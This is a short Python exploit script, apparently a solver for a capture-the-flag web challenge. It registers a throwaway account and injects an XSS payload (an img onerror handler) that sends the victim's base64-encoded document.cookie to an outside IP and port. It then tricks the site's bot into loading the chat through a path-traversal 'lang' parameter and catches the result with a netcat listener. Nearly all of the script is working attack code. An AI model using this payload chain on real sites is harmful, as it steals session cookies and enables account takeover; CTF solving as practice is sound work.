import requests
import random

# run nc -lnvp [port] on your machine that has port exposed to get flag
REMOTE_IP = '128.140.75.1'
REMOTE_PORT = 1231


def rand_str(length=8):
  return ''.join([chr(random.randint(0x41,0x51)) for _ in range(length)])

s = requests.session()
uname = rand_str(8)
res = s.post('https://ctf.pilvar.uk/api/register', json={"username":uname})

pw = res.json()['password']
print(uname, pw)

res = s.post('https://ctf.pilvar.uk/api/login', json={"username":uname, "password":pw})

res = s.post('https://ctf.pilvar.uk/api/chats', json={"prompt":f"<img src=x onerror='document.location=\"http://{REMOTE_IP}:{REMOTE_PORT}/\"+btoa(document.cookie)'>"})
chat_id = res.json()['id']
res = s.post('https://ctf.pilvar.uk/api/dispatch', json={"target":"bot", "url":f"/chat/{chat_id}?lang=../../cdn-cgi/challenge-platform/h/g/scripts/jsd/api.js/api.js%3fonload=stop%26"})

print(res.json())
